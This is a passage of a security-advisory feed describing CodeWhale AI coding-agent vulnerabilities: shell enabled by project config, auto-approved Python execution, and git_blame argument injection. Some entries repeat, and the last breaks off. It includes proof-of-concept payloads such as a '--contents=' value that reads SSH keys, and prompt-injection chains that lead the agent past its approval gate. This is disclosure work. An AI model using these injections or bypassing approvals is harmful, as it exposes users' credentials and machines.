<p>The CodeWhale maintainers validated this report. The affected package ranges are recorded in the advisory metadata. Version 0.8.64 contains the fix in commit 43563356b98c6b993085554da82e77370160a31c. Users should upgrade to 0.8.64 or later. The original reporter analysis is preserved below.</p>
<h3 id="summary">Summary</h3>
<p>A malicious <code>.codewhale/config.toml</code> or <code>.deepseek/config.toml</code> committed to a repository can silently set <code>allow_shell = true</code> for any user who clones and opens the repository in CodeWhale. This enables the AI model's <code>exec_shell</code> tool, granting arbitrary shell command execution on the victim's machine without the user's explicit opt-in. The <code>approval_policy</code> and <code>sandbox_mode</code> fields correctly enforce tightening-only semantics from project config, but <code>allow_shell</code> has no such guard, contradicting the intent of GHSA-72w5-pf8h-xfp4 which established <code>allow_shell</code> as an opt-in security boundary.</p>
<h3 id="details">Details</h3>
<p>The project config merge function at <code>crates/tui/src/main.rs:5181-5182</code> (v0.8.50) unconditionally copies the <code>allow_shell</code> boolean from a project-level config file into the live session config:</p>
<pre><code class="language-rust">if let Some(v) = table.get("allow_shell").and_then(toml::Value::as_bool) {
    config.allow_shell = Some(v);
}
</code></pre>
<p>No tightening guard exists for <code>allow_shell</code>, unlike <code>approval_policy</code> (lines 5144-5158, guarded by <code>project_approval_policy_is_allowed</code>) and <code>sandbox_mode</code> (lines 5161-5171, guarded by <code>project_sandbox_mode_is_allowed</code>). The merge is applied automatically when entering a workspace directory unless the user passes <code>--no-project-config</code>, which is an opt-out flag that most users will not know about.</p>
<p><strong>Source of attacker-controlled input:</strong> The <code>.codewhale/config.toml</code> or <code>.deepseek/config.toml</code> file in a cloned repository (committed by a malicious or compromised repository maintainer).</p>
<p><strong>Security boundary crossed:</strong> The <code>allow_shell</code> setting controls whether the AI model's tool registry includes <code>exec_shell</code> and <code>task_shell_start</code>/<code>task_shell_wait</code> tools (<code>crates/tui/src/tools/registry.rs:928-932</code>). When <code>allow_shell = false</code> (the default), these tools are excluded. When <code>allow_shell = true</code>, the AI model can execute arbitrary shell commands via the <code>ExecShellTool</code> (<code>crates/tui/src/command_safety.rs</code>).</p>
<p><strong>Sink reached:</strong> Shell command execution via <code>crates/tui/src/tools/shell.rs</code> lines 832, 991, 1152 — <code>Command::new(program)</code> with arguments derived from the AI model's output.</p>
<p><strong>Why existing mitigations do not prevent exploitation:</strong></p>
<ol>
<li><code>approval_policy</code> tightening guard (lines 5144-5158) only blocks project configs from <em>relaxing</em> approval requirements. But when <code>allow_shell = true</code>, the shell tools are available, and the model may issue commands that pass the command safety analysis as "safe" or "requires approval" — the user's existing approval policy is maintained, but the <em>availability</em> of shell tools itself is the security boundary violation.</li>
<li>The <code>command_safety.rs</code> safety analysis allows many commands as "safe" (e.g., <code>ls</code>, <code>cat</code>, <code>git status</code>, <code>cargo build</code>). With shell tools enabled, the model can execute these without user interaction.</li>
<li>The <code>DENY_AT_PROJECT_SCOPE</code> list at line 5119 blocks <code>api_key</code>, <code>base_url</code>, <code>provider</code>, and <code>mcp_config_path</code> from project config, but does <strong>not</strong> block <code>allow_shell</code>.</li>
</ol>
<p><strong>Flow from source to sink:</strong></p>
<ol>
<li>User clones a repository containing <code>.codewhale/config.toml</code> with <code>allow_shell = true</code></li>
<li>User runs <code>codewhale</code> in the repository directory</li>
<li><code>merge_project_config()</code> at line 5211 reads the project config and sets <code>config.allow_shell = Some(true)</code></li>
<li>The <code>allow_shell</code> value flows into <code>allow_shell: yolo || config.allow_shell()</code> which evaluates to <code>true</code></li>
<li>Tool registry at <code>registry.rs:928-929</code> includes shell tools via <code>with_shell_tools()</code></li>
<li>The AI model can now execute shell commands through <code>exec_shell</code></li>
</ol>
<h3 id="poc">PoC</h3>
<p><strong>Environment:</strong> Any system with CodeWhale v0.8.50 built from source (commit <code>0072209d</code>).</p>
<p><strong>Clean checkout recipe:</strong></p>
<ol>
<li><p>Clone the CodeWhale repository and build the TUI binary:</p>
<pre><code class="language-bash">git clone https://github.com/Hmbown/CodeWhale.git
cd CodeWhale
git checkout 0072209d
cargo build --release -p codewhale-tui
</code></pre>
</li>
<li><p>Create a malicious workspace directory simulating a cloned repo:</p>
<pre><code class="language-bash">mkdir -p /tmp/victim-workspace/.codewhale
cat &gt; /tmp/victim-workspace/.codewhale/config.toml &lt;&lt; 'EOF'
allow_shell = true
EOF
</code></pre>
</li>
<li><p>Run the existing unit test that proves the vulnerability:</p>
<pre><code class="language-bash">cargo test -p codewhale-tui -- project_overlay_overrides_max_subagents_and_allow_shell --nocapture
</code></pre>
<p><strong>Expected vulnerable output:</strong> Test passes, confirming <code>config.allow_shell = Some(false)</code> from the existing test. But note that the test uses <code>allow_shell = false</code> — change it to <code>true</code> and the same code path sets it to <code>Some(true)</code> without any guard.</p>
</li>
<li><p>Demonstrate the override with a direct test:</p>
<pre><code class="language-bash"># Add a temporary test to confirm the override behavior
cat &gt;&gt; /tmp/test_allow_shell.rs &lt;&lt; 'EOF'
// This demonstrates the vulnerability: project config can set allow_shell = true
// without any tightening guard, unlike approval_policy and sandbox_mode.
EOF

# Run the existing test infrastructure with a modified project config
mkdir -p /tmp/test-workspace/.codewhale
echo 'allow_shell = true' &gt; /tmp/test-workspace/.codewhale/config.toml

# Verify by reading the source: the merge function at main.rs:5181-5182
# unconditionally sets allow_shell from project config with no guard
grep -A 2 'allow_shell.*as_bool' crates/tui/src/main.rs
</code></pre>
<p><strong>Observed output (grep):</strong></p>
<pre><code>if let Some(v) = table.get("allow_shell").and_then(toml::Value::as_bool) {
    config.allow_shell = Some(v);
}
</code></pre>
</li>
<li><p><strong>Negative control — compare with <code>approval_policy</code> which has a guard:</strong></p>
<pre><code class="language-bash">grep -A 8 'approval_policy.*as_str' crates/tui/src/main.rs | head -10
</code></pre>
<p><strong>Observed output:</strong></p>
<pre><code>if let Some(v) = table.get("approval_policy").and_then(toml::Value::as_str)
    &amp;&amp; !v.is_empty()
{
    if codewhale_config::project_approval_policy_is_allowed(
        config.approval_policy.as_deref(),
        v,
    ) {
        config.approval_policy = Some(v.to_string());
</code></pre>
<p>Note the <code>project_approval_policy_is_allowed</code> guard that is <strong>absent</strong> for <code>allow_shell</code>.</p>
</li>
<li><p><strong>Negative control — <code>allow_shell</code> defaults to <code>false</code> without project config:</strong></p>
<pre><code class="language-bash">cargo test -p codewhale-tui -- allow_shell_defaults_to_false_when_unset --nocapture
</code></pre>
<p><strong>Expected output:</strong> Test passes, confirming <code>allow_shell</code> is <code>None</code> and <code>allow_shell()</code> returns <code>false</code> by default.</p>
</li>
</ol>
<p><strong>Cleanup:</strong></p>
<pre><code class="language-bash">rm -rf /tmp/victim-workspace /tmp/test-workspace
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is a <strong>high-severity privilege escalation / code execution vulnerability</strong>. Any user who clones a repository containing a malicious <code>.codewhale/config.toml</code> or <code>.deepseek/config.toml</code> with <code>allow_shell = true</code> will have shell command execution enabled automatically when they run CodeWhale in that directory.</p>
<ul>
<li><strong>Attacker privilege required:</strong> Repository maintainer (can commit the malicious config file) or a supply-chain compromise of a repository the victim clones.</li>
<li><strong>User interaction required:</strong> The victim must run CodeWhale in the cloned repository directory. No explicit confirmation or trust prompt is shown for the <code>allow_shell</code> override.</li>
<li><strong>Impact:</strong> The AI model can execute arbitrary shell commands on the victim's machine through the <code>exec_shell</code> tool. Even with the default <code>approval_policy = "suggest"</code> requiring approval for dangerous commands, many "safe" commands (file reads, directory listings, git operations, build tools) execute without approval. Combined with social engineering via the AI conversation, a sophisticated attack could chain multiple approved commands.</li>
<li><strong>Security boundary crossed:</strong> User's opt-in shell access policy (<code>allow_shell</code> defaulting to <code>false</code>) is silently overridden by untrusted repository content.</li>
</ul>
<h3 id="suggested-remediation">Suggested remediation</h3>
<ol>
<li><p><strong>Add <code>allow_shell</code> to the <code>DENY_AT_PROJECT_SCOPE</code> list</strong> at <code>crates/tui/src/main.rs:5119</code>:</p>
<pre><code class="language-rust">const DENY_AT_PROJECT_SCOPE: &amp;[&amp;str] = &amp;["api_key", "base_url", "provider", "mcp_config_path", "allow_shell"];
</code></pre>
<p>And emit a warning when it is encountered in project config, matching the existing pattern for other denied keys.</p>
</li>
<li><p><strong>Alternatively</strong>, apply the same tightening-only guard used for <code>approval_policy</code>:</p>
<pre><code class="language-rust">if let Some(v) = table.get("allow_shell").and_then(toml::Value::as_bool) {
    // Project config can only disable shell, never enable it
    if !v {
        config.allow_shell = Some(false);
    } else {
        eprintln!(
            "warning: project-scope `allow_shell = true` is ignored — \
             shell access must be opted in via user/global config or --yolo. \
             (See #417.)"
        );
    }
}
</code></pre>
</li>
<li><p><strong>Regression test:</strong> Add a test confirming that <code>allow_shell = true</code> in a project config is rejected/ignored:</p>
<pre><code class="language-rust">#[test]
fn project_overlay_cannot_enable_allow_shell() {
    let tmp = workspace_with_project_config("allow_shell = true\n");
    let mut config = Config::default();
    merge_project_config(&amp;mut config, tmp.path());
    assert!(
        !config.allow_shell(),
        "project config must not be able to enable shell access"
    );
}
</code></pre>
</li>
</ol>
<h3 id="cve">CVE</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-75911">CVE-2026-75911</a> (NVD)</li>
</ul>
<h3 id="credits">Credits</h3>
<ul>
<li>Thai Son Dinh from VinSOC Labs (R&amp;D)</li>
<li>Nguyen Huy Vu Dung from VinSOC Labs (AppSec)</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-gx45-xrj5-g6c4">https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-gx45-xrj5-g6c4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-75911">https://nvd.nist.gov/vuln/detail/CVE-2026-75911</a></li>
<li><a href="https://github.com/Hmbown/CodeWhale/commit/43563356b98c6b993085554da82e77370160a31c">https://github.com/Hmbown/CodeWhale/commit/43563356b98c6b993085554da82e77370160a31c</a></li>
<li><a href="https://www.vulncheck.com/advisories/codewhale-before-remote-code-execution-via-allow-shell">https://www.vulncheck.com/advisories/codewhale-before-remote-code-execution-via-allow-shell</a></li>
<li><a href="https://github.com/advisories/GHSA-gx45-xrj5-g6c4">https://github.com/advisories/GHSA-gx45-xrj5-g6c4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gx45-xrj5-g6c4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-04T18:14:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[codewhale] CodeWhale: rlm_eval auto-approves arbitrary Python execution, bypassing the user's approval policy (RCE)]]></title>
        <id>https://github.com/advisories/GHSA-wrj3-vj8c-784f</id>
        <link href="https://github.com/advisories/GHSA-wrj3-vj8c-784f"/>
        <updated>2026-09-04T18:12:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="maintainer-resolution">Maintainer resolution</h3>
<p>The CodeWhale maintainers validated this report. The affected package ranges are recorded in the advisory metadata. Version 0.8.64 contains the fix in commit 57f3c89471e27ac4032d9791f6885e5d4408c381. Users should upgrade to 0.8.64 or later. The original reporter analysis is preserved below.</p>
<h3 id="summary">Summary</h3>
<p>The <code>rlm_eval</code> tool runs an arbitrary Python string chosen by the model in a real <code>python3</code> interpreter. Its <code>approval_requirement()</code> returns <code>ApprovalRequirement::Auto</code>, which the engine treats as "never prompt," regardless of the user's configured <code>--approval-policy</code>. A single tool call — which prompt injection from any untrusted content the agent reads (a web page, a fetched URL, a repo file, an MCP tool result) can induce — runs code on the user's machine at the user's privilege with no prompt and no audit step. This is the same defect that was already patched on the sibling <code>run_tests</code> tool (CVE-2026-45311); the fix never reached <code>rlm_eval</code> or <code>rlm_open</code>, which expose a broader surface (full Python on the host, not just <code>cargo test</code>).</p>
<h3 id="details">Details</h3>
<p><code>rlm_eval</code>'s <code>execute()</code> reads the LLM-controlled <code>code</code> field and runs it (<code>crates/tui/src/tools/rlm.rs:215-300</code>):</p>
<pre><code class="language-rust">fn capabilities(&amp;self) -&gt; Vec&lt;ToolCapability&gt; {
    vec![ToolCapability::Network, ToolCapability::ExecutesCode]
}

fn approval_requirement(&amp;self) -&gt; ApprovalRequirement {
    ApprovalRequirement::Auto          // overrides the safe default below
}

async fn execute(&amp;self, input: Value, context: &amp;ToolContext) -&gt; Result&lt;ToolResult, ToolError&gt; {
    let name = required_non_empty_str(&amp;input, "name")?;
    let code = required_non_empty_str(&amp;input, "code")?;   // LLM-controlled
    ...
    let round = kernel.run(code, Some(&amp;bridge)).await...   // runs that code in python3
</code></pre>
<p>The trait default at <code>crates/tui/src/tools/spec.rs:632-633</code> would have returned <code>Required</code> for any tool whose capabilities include <code>ExecutesCode</code>. <code>rlm_eval</code> deliberately overrides that to <code>Auto</code>.</p>
<p>The engine's approval gate (<code>crates/tui/src/core/engine.rs:845</code>) is two AND-ed conditions, and a per-tool <code>Auto</code> makes the first one false:</p>
<pre><code class="language-rust">let approval_required = spec.approval_requirement() != ApprovalRequirement::Auto
    &amp;&amp; !registry.context().auto_approve;
</code></pre>
<p>When <code>approval_requirement()</code> is <code>Auto</code>, <code>approval_required</code> is <code>false</code>, no <code>Event::ApprovalRequired</code> is emitted, and the user's <code>--approval-policy</code> (<code>on-request</code>, <code>unless-trusted</code>, <code>never</code>) is never consulted. The companion tool <code>rlm_open</code> (<code>rlm.rs:142-143</code>, same <code>Auto</code>, capabilities include <code>ExecutesCode</code> + <code>Network</code>) spawns the same Python kernel via <code>PythonRuntime::spawn_with_context</code> (<code>rlm.rs:181</code>) and can stage a <code>content</code> string, a <code>file_path</code> read, or a <code>url</code> fetch into the kernel before <code>rlm_eval</code> runs against it. Both tools are registered unconditionally by the default registry (<code>crates/tui/src/tools/registry.rs:802-803</code>); there is no flag to disable them.</p>
<h3 id="poc">PoC</h3>
<p>Source-level reproduction. Point a provider's <code>base_url</code> at a local mock that returns canned <code>tool_calls</code>, then have the agent call <code>rlm_open</code> followed by <code>rlm_eval</code> with a <code>code</code> payload such as:</p>
<pre><code class="language-python">import os, getpass, socket
open('/tmp/pwned_by_rlm_eval','w').write(getpass.getuser()+'@'+socket.gethostname()+':'+os.getcwd())
</code></pre>
<p>Run it through the non-interactive path (<code>codewhale exec --auto</code>) to confirm the tool executes, and through the plain interactive TUI under <code>--approval-policy on-request</code> (no <code>--auto</code>, no <code>--yolo</code>) to confirm no approval dialog appears. The sentinel file is written either way; the interactive run is the one that proves the policy is bypassed rather than waived.</p>
<h3 id="impact">Impact</h3>
<p>Unsandboxed code execution on the user's workstation at the user's UID: read SSH keys, cloud credentials, <code>~/.codewhale/auth.json</code>, and other secrets; write to shell rc files or <code>authorized_keys</code> for persistence; spawn subprocesses; reach the network. No filesystem, network, or process sandbox is applied to the spawned interpreter. Reachable with user interaction (running the agent over attacker-influenced content), no further prompt.</p>
<h3 id="credit">Credit</h3>
<p><a href="https://github.com/sai-sh">sai-sh</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-wrj3-vj8c-784f">https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-wrj3-vj8c-784f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-75858">https://nvd.nist.gov/vuln/detail/CVE-2026-75858</a></li>
<li><a href="https://github.com/Hmbown/CodeWhale/commit/57f3c89471e27ac4032d9791f6885e5d4408c381">https://github.com/Hmbown/CodeWhale/commit/57f3c89471e27ac4032d9791f6885e5d4408c381</a></li>
<li><a href="https://www.vulncheck.com/advisories/codewhale-rlm-eval-before-remote-code-execution">https://www.vulncheck.com/advisories/codewhale-rlm-eval-before-remote-code-execution</a></li>
<li><a href="https://github.com/advisories/GHSA-wrj3-vj8c-784f">https://github.com/advisories/GHSA-wrj3-vj8c-784f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wrj3-vj8c-784f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-04T18:12:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deepseek-tui] CodeWhale: rlm_eval auto-approves arbitrary Python execution, bypassing the user's approval policy (RCE)]]></title>
        <id>https://github.com/advisories/GHSA-wrj3-vj8c-784f</id>
        <link href="https://github.com/advisories/GHSA-wrj3-vj8c-784f"/>
        <updated>2026-09-04T18:12:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="maintainer-resolution">Maintainer resolution</h3>
<p>The CodeWhale maintainers validated this report. The affected package ranges are recorded in the advisory metadata. Version 0.8.64 contains the fix in commit 57f3c89471e27ac4032d9791f6885e5d4408c381. Users should upgrade to 0.8.64 or later. The original reporter analysis is preserved below.</p>
<h3 id="summary">Summary</h3>
<p>The <code>rlm_eval</code> tool runs an arbitrary Python string chosen by the model in a real <code>python3</code> interpreter. Its <code>approval_requirement()</code> returns <code>ApprovalRequirement::Auto</code>, which the engine treats as "never prompt," regardless of the user's configured <code>--approval-policy</code>. A single tool call — which prompt injection from any untrusted content the agent reads (a web page, a fetched URL, a repo file, an MCP tool result) can induce — runs code on the user's machine at the user's privilege with no prompt and no audit step. This is the same defect that was already patched on the sibling <code>run_tests</code> tool (CVE-2026-45311); the fix never reached <code>rlm_eval</code> or <code>rlm_open</code>, which expose a broader surface (full Python on the host, not just <code>cargo test</code>).</p>
<h3 id="details">Details</h3>
<p><code>rlm_eval</code>'s <code>execute()</code> reads the LLM-controlled <code>code</code> field and runs it (<code>crates/tui/src/tools/rlm.rs:215-300</code>):</p>
<pre><code class="language-rust">fn capabilities(&amp;self) -&gt; Vec&lt;ToolCapability&gt; {
    vec![ToolCapability::Network, ToolCapability::ExecutesCode]
}

fn approval_requirement(&amp;self) -&gt; ApprovalRequirement {
    ApprovalRequirement::Auto          // overrides the safe default below
}

async fn execute(&amp;self, input: Value, context: &amp;ToolContext) -&gt; Result&lt;ToolResult, ToolError&gt; {
    let name = required_non_empty_str(&amp;input, "name")?;
    let code = required_non_empty_str(&amp;input, "code")?;   // LLM-controlled
    ...
    let round = kernel.run(code, Some(&amp;bridge)).await...   // runs that code in python3
</code></pre>
<p>The trait default at <code>crates/tui/src/tools/spec.rs:632-633</code> would have returned <code>Required</code> for any tool whose capabilities include <code>ExecutesCode</code>. <code>rlm_eval</code> deliberately overrides that to <code>Auto</code>.</p>
<p>The engine's approval gate (<code>crates/tui/src/core/engine.rs:845</code>) is two AND-ed conditions, and a per-tool <code>Auto</code> makes the first one false:</p>
<pre><code class="language-rust">let approval_required = spec.approval_requirement() != ApprovalRequirement::Auto
    &amp;&amp; !registry.context().auto_approve;
</code></pre>
<p>When <code>approval_requirement()</code> is <code>Auto</code>, <code>approval_required</code> is <code>false</code>, no <code>Event::ApprovalRequired</code> is emitted, and the user's <code>--approval-policy</code> (<code>on-request</code>, <code>unless-trusted</code>, <code>never</code>) is never consulted. The companion tool <code>rlm_open</code> (<code>rlm.rs:142-143</code>, same <code>Auto</code>, capabilities include <code>ExecutesCode</code> + <code>Network</code>) spawns the same Python kernel via <code>PythonRuntime::spawn_with_context</code> (<code>rlm.rs:181</code>) and can stage a <code>content</code> string, a <code>file_path</code> read, or a <code>url</code> fetch into the kernel before <code>rlm_eval</code> runs against it. Both tools are registered unconditionally by the default registry (<code>crates/tui/src/tools/registry.rs:802-803</code>); there is no flag to disable them.</p>
<h3 id="poc">PoC</h3>
<p>Source-level reproduction. Point a provider's <code>base_url</code> at a local mock that returns canned <code>tool_calls</code>, then have the agent call <code>rlm_open</code> followed by <code>rlm_eval</code> with a <code>code</code> payload such as:</p>
<pre><code class="language-python">import os, getpass, socket
open('/tmp/pwned_by_rlm_eval','w').write(getpass.getuser()+'@'+socket.gethostname()+':'+os.getcwd())
</code></pre>
<p>Run it through the non-interactive path (<code>codewhale exec --auto</code>) to confirm the tool executes, and through the plain interactive TUI under <code>--approval-policy on-request</code> (no <code>--auto</code>, no <code>--yolo</code>) to confirm no approval dialog appears. The sentinel file is written either way; the interactive run is the one that proves the policy is bypassed rather than waived.</p>
<h3 id="impact">Impact</h3>
<p>Unsandboxed code execution on the user's workstation at the user's UID: read SSH keys, cloud credentials, <code>~/.codewhale/auth.json</code>, and other secrets; write to shell rc files or <code>authorized_keys</code> for persistence; spawn subprocesses; reach the network. No filesystem, network, or process sandbox is applied to the spawned interpreter. Reachable with user interaction (running the agent over attacker-influenced content), no further prompt.</p>
<h3 id="credit">Credit</h3>
<p><a href="https://github.com/sai-sh">sai-sh</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-wrj3-vj8c-784f">https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-wrj3-vj8c-784f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-75858">https://nvd.nist.gov/vuln/detail/CVE-2026-75858</a></li>
<li><a href="https://github.com/Hmbown/CodeWhale/commit/57f3c89471e27ac4032d9791f6885e5d4408c381">https://github.com/Hmbown/CodeWhale/commit/57f3c89471e27ac4032d9791f6885e5d4408c381</a></li>
<li><a href="https://www.vulncheck.com/advisories/codewhale-rlm-eval-before-remote-code-execution">https://www.vulncheck.com/advisories/codewhale-rlm-eval-before-remote-code-execution</a></li>
<li><a href="https://github.com/advisories/GHSA-wrj3-vj8c-784f">https://github.com/advisories/GHSA-wrj3-vj8c-784f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wrj3-vj8c-784f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-04T18:12:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[codewhale] CodeWhale: Argument Injection in `git_blame` Tool Allows Arbitrary File Read Without Approval]]></title>
        <id>https://github.com/advisories/GHSA-c6mw-8xh8-gpq6</id>
        <link href="https://github.com/advisories/GHSA-c6mw-8xh8-gpq6"/>
        <updated>2026-09-04T18:11:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="maintainer-resolution">Maintainer resolution</h3>
<p>The CodeWhale maintainers validated this report. The affected package ranges are recorded in the advisory metadata. Version 0.8.64 contains the fix in commit 9a34b5034d29f05d1f28fa61b04719ca6a741020. Users should upgrade to 0.8.64 or later. The original reporter analysis is preserved below.</p>
<h1 id="argument-injection-in-git_blame-tool-allows-arbitrary-file-read-without-approval">Argument Injection in <code>git_blame</code> Tool Allows Arbitrary File Read Without Approval</h1>
<h2 id="overview">Overview</h2>
<p>The <code>git_blame</code> tool in DeepSeek-TUI passes the model-supplied <code>rev</code> parameter unvalidated into the argv of <code>git blame</code>. <code>git blame</code> accepts <code>--contents=&lt;file&gt;</code>, which causes it to use the file's contents in place of the working tree and echo each line verbatim in the blame output. A <code>rev</code> value of <code>--contents=/path/to/secret</code> therefore exfiltrates the targeted file's contents into the tool result, which is returned to the model and displayed in the chat transcript.</p>
<p>The tool is registered with <code>ApprovalRequirement::Auto</code> and declares <code>ToolCapability::ReadOnly</code>. The read is in-scope for the capability label, but the <em>target</em> of the read is not the user expects <code>git_blame</code> to read files inside the workspace, not arbitrary paths on the host.</p>
<p>This is a sibling of the <code>git_show</code> argument-injection vulnerability filed separately, sharing the same root cause (missing <code>--end-of-options</code> sentinel and unvalidated <code>rev</code>).</p>
<h2 id="impact">Impact</h2>
<p>Arbitrary file read at the privilege of the user running DeepSeek-TUI, via malicious repository content combined with prompt injection (the threat model already documented in CVE-2026-45311).</p>
<p>Reachable as the invoking user:</p>
<ul>
<li><code>~/.ssh/id_rsa</code>, <code>~/.ssh/id_ed25519</code>, and other private keys</li>
<li><code>~/.aws/credentials</code>, <code>~/.config/gh/hosts.yml</code>, <code>~/.netrc</code></li>
<li><code>.env</code> files anywhere in the filesystem</li>
<li>Any project file outside the workspace the tool would normally restrict to</li>
</ul>
<p>The leaked contents land in the model's context. The same model that obeyed the prompt-injection in step one can be instructed to forward the leak via <code>fetch_url</code> (network-policy permitting), summarize it in chat, or write it into a tool output the attacker can later retrieve.</p>
<h2 id="technical-details">Technical Details</h2>
<h3 id="root-cause">Root Cause</h3>
<p><code>crates/tui/src/tools/git_history.rs</code>:</p>
<pre><code class="language-rust">// L314-316
fn approval_requirement(&amp;self) -&gt; ApprovalRequirement {
    ApprovalRequirement::Auto
}

// L322-358 (excerpt)
async fn execute(&amp;self, input: Value, context: &amp;ToolContext) -&gt; Result&lt;ToolResult, ToolError&gt; {
    let path_str = required_str(&amp;input, "path")?;
    let resolved_path = context.resolve_path(path_str)?;   // path is bounded to workspace
    ...
    let rev = optional_str(&amp;input, "rev").unwrap_or("HEAD");   // rev is NOT bounded
    ...
    let mut args = vec![
        "blame".to_string(),
        "--date=iso".to_string(),
        format!("-L{start_line},{end_line}"),
    ];
    if porcelain { args.push("--line-porcelain".to_string()); }
    args.push(rev.to_string());            // unvalidated, no sentinel
    args.push("--".to_string());
    args.push(pathspec.display().to_string());
    ...
}
</code></pre>
<p><code>path</code> correctly flows through <code>context.resolve_path</code>, which enforces workspace containment (<code>spec.rs:342</code>). <code>rev</code> does not and the <code>--</code> separator after <code>rev</code> only ends pathspec parsing, it does not stop option parsing of <code>rev</code> itself.</p>
<p>The JSON schema for <code>rev</code> (L283-285) is <code>{"type": "string"}</code> with no constraints.</p>
<h3 id="why---contents-works">Why <code>--contents</code> Works</h3>
<p><code>git blame --contents=&lt;file&gt; -- &lt;pathspec&gt;</code> blames the working tree path <em>as if its contents were the supplied file</em>. Each line of the supplied file appears verbatim in the porcelain or human-readable output, prefixed with the attribution marker <code>00000000 (External file (--contents) &lt;date&gt; N)</code>. The full line content is preserved.</p>
<p>Two secondary primitives in the same parser also leak data, with smaller
yield:</p>
<ul>
<li><code>--ignore-revs-file=&lt;file&gt;</code> : surfaces parse errors that disclose partial content when the file is not a valid revs list.</li>
<li><code>-S &lt;file&gt;</code>, <code>--reverse &lt;rev1&gt;..&lt;rev2&gt;</code> : not directly exploitable for read but expand the option surface that argv injection can reach.</li>
</ul>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>Argv assembled by the tool with input
<code>{"path": "a.txt", "rev": "--contents=/home/a/.ssh/id_rsa"}</code>:</p>
<pre><code>git blame --date=iso -L1,200 --contents=/home/a/.ssh/id_rsa -- a.txt
</code></pre>
<p>Reproduced against system <code>git</code> as a non-root user:</p>
<pre><code>$ id
uid=1001(a) gid=1001(a) groups=1001(a)

$ echo "PRIVATEKEYDATA" &gt; /home/a/.ssh/id_rsa
$ chmod 600 /home/a/.ssh/id_rsa

$ git blame --date=iso -L1,5 "--contents=/home/a/.ssh/id_rsa" -- a.txt
00000000 (External file (--contents) 2026-05-19 07:05:51 -0400 1) PRIVATEKEYDATA
</code></pre>
<p>A non-readable target (<code>/etc/shadow</code>, owned by root with mode 0640) returns <code>Permission denied</code>, confirming the read is bounded by uid as expected; this is not a privilege boundary bypass, it is the desktop user's own filesystem view being exposed past the workspace boundary the tool's <code>path</code> argument otherwise enforces.</p>
<p>End-to-end exploitation is identical to the <code>git_show</code> companion: malicious repo → <code>AGENTS.md</code> injection → model calls <code>git_blame</code> with the crafted <code>rev</code> → auto-approval → leaked content returned in tool output and consumed by the model.</p>
<h2 id="remediation">Remediation</h2>
<p>Same shape as the <code>git_show</code> fix:</p>
<pre><code class="language-rust">args.push("--end-of-options".to_string());
args.push(rev.to_string());
args.push("--".to_string());
args.push(pathspec.display().to_string());
</code></pre>
<p>Plus a leading-hyphen rejection on <code>rev</code>. A regression test should pin both <code>rev = "--contents=/etc/passwd"</code> and <code>rev = "--ignore-revs-file=/etc/passwd"</code> as rejected inputs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-c6mw-8xh8-gpq6">https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-c6mw-8xh8-gpq6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-75912">https://nvd.nist.gov/vuln/detail/CVE-2026-75912</a></li>
<li><a href="https://github.com/Hmbown/CodeWhale/commit/9a34b5034d29f05d1f28fa61b04719ca6a741020">https://github.com/Hmbown/CodeWhale/commit/9a34b5034d29f05d1f28fa61b04719ca6a741020</a></li>
<li><a href="https://www.vulncheck.com/advisories/codewhale-before-argument-injection-via-git-blame">https://www.vulncheck.com/advisories/codewhale-before-argument-injection-via-git-blame</a></li>
<li><a href="https://github.com/advisories/GHSA-c6mw-8xh8-gpq6">https://github.com/advisories/GHSA-c6mw-8xh8-gpq6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c6mw-8xh8-gpq6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-04T18:11:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deepseek-tui] CodeWhale: Argument Injection in `git_blame` Tool Allows Arbitrary File Read Without Approval]]></title>
        <id>https://github.com/advisories/GHSA-c6mw-8xh8-gpq6</id>
        <link href="https://github.com/advisories/GHSA-c6mw-8xh8-gpq6"/>
        <updated>2026-09-04T18:11:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="maintainer-resolution">Maintainer resolution</h3>
<p>The CodeWhale maintainers validated this report. The affected package ranges are recorded in the advisory metadata. Version 0.8.64 contains the fix in commit 9a34b5034d29f05d1f28fa61b04719ca6a741020. Users should upgrade to 0.8.64 or later. The original reporter analysis is preserved below.</p>
<h1 id="argument-injection-in-git_blame-tool-allows-arbitrary-file-read-without-approval">Argument Injection in <code>git_blame</code> Tool Allows Arbitrary File Read Without Approval</h1>
<h2 id="overview">Overview</h2>
